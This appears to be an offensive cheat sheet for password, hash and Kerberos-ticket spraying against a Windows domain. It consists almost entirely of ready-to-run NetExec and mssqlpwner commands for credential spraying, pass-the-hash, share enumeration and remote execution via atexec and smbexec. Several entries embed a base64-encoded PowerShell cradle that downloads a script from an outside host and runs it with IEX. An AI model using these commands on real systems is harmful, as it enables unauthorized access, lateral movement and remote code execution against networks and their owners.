# Password Spraying

Password, Hash, and Tickets Spraying

### 1) Domain user creds

    nxc smb 10.10.100.0/24 -d domain.com -u user -p password
    nxc winrm 10.10.100.0/24 -d domain.com -u user -H ffffffffffffffffffffffffffffffff

### 2) Local admin creds

    nxc smb 10.10.100.0/24 -d . -u Administrator -H ffffffffffffffffffffffffffffffff

### 3) Enumerate shares

    nxc smb 10.10.100.0/24 -d domain.com -u user -p password --shares

### 4) Tickets spraying

    nxc smb 10.10.100.0/24 --use-kcache
    nxc smb machine.domain.com --use-kcache --exec-method atexec -x "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="

### 5) SSH creds spray - for domain account

    nxc ssh 10.10.100.0/24 -u user@domain.com -p password

### 6) NXC Command Execution

    nxc smb 10.10.100.15 -d domain.com -u user -H ffffffffffffffffffffffffffffffff --exec-method smbexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='

### 7) Local admin

    nxc smb 10.10.100.15 -d . -u user -p password --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='

### 8) atexec always works

    nxc smb 10.10.100.15 -d domain.com -u user -H ffffffffffffffffffffffffffffffff --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='

### 9) DB Spray

    mssqlpwner domain.com/user:password@10.10.100.15 -windows-auth enumerate
    mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth enumerate
    mssqlpwner domain.com/machineaccount\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
